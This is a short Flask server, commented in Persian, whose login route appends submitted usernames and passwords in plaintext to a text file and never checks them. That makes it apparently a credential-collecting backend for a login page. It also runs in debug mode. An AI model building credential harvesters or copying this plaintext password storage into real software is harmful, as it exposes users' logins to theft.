from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

# مسیر اصلی برای نمایش صفحه وب
@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

# مسیر برای دریافت داده‌ها از فرم
@app.route('/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')

    if username and password:
        # ذخیره داده‌ها در یک فایل
        with open('user_data.txt', 'a') as file:
            file.write(f'Username: {username}, Password: {password}\n')

        return jsonify({"message": "داده‌ها با موفقیت ذخیره شدند!"})
    else:
        return jsonify({"message": "خطا: داده‌ها نامعتبر هستند!"}), 400

if __name__ == '__main__':
    app.run(debug=True)